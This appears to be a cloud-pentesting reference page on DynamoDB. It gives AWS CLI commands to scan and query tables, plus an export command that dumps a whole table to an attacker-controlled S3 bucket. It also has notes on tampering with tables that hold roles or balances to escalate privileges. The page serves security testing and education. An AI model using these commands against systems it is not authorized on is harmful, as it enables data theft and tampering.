---
title: "DynamoDB: reading and exporting tables through Scan and export"
description: "Reading and tampering with DynamoDB tables through Scan and Query, and exporting tables to S3."
keywords:
  - DynamoDB
  - Scan
  - Query
  - table
  - export
---

# DynamoDB

DynamoDB has no network surface: access is entirely IAM. A principal holding `dynamodb:Scan` or `dynamodb:Query` reads the table contents directly through the API, and `dynamodb:ExportTableToPointInTime` dumps a whole table to S3 for bulk exfiltration. Write actions (`PutItem`, `UpdateItem`, `DeleteItem`) let you tamper with application state, which matters where the table backs authz or balances.

## Reading tables

```bash
aws dynamodb list-tables
aws dynamodb scan --table-name <t> --output json          # whole table
aws dynamodb query --table-name <t> \
  --key-condition-expression 'pk = :v' \
  --expression-attribute-values '{":v":{"S":"tenant#1"}}'
```

## Bulk export to S3

```bash
aws dynamodb export-table-to-point-in-time \
  --table-arn <arn> --s3-bucket <attacker-or-reachable-bucket> \
  --export-format DYNAMODB_JSON
```

## Exploitation notes

- `Scan` is expensive and paginates; large tables come out faster through the point-in-time export, which needs the table to have PITR enabled.
- Writes to a table that stores roles, entitlements, or feature flags can be an application-level privilege escalation independent of IAM.
- Streams (`dynamodb:GetRecords` on a table stream) leak ongoing changes where enabled.

## Tools

- **AWS CLI** (`dynamodb scan`, `export-table-to-point-in-time`).
- **Pacu** (`dynamodb__scan`): enumerate and dump tables across regions.

## References

- [AWS: exporting DynamoDB to S3](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/S3DataExport.html)
- [HackTricks Cloud: AWS DynamoDB](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
